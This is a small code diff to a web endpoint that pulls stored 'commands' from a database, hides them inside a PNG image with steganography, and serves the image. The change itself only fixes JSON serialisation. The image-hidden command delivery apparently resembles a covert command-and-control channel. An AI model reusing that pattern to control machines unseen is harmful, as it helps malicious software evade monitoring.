@@ -113,7 +113,7 @@ def get_commands():
             db_resp = {"commands": "No commands found"}
         
         img = Steganography.iio.imread("doge.png")
-        Steganography.iio.imwrite("doge_encoded.png", Steganography.encode(img, json.dumps(db_resp)))
+        Steganography.iio.imwrite("doge_encoded.png", Steganography.encode(img, json.dumps(db_resp, default=str)))
         response = send_file('doge_encoded.png', mimetype='image/png')
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
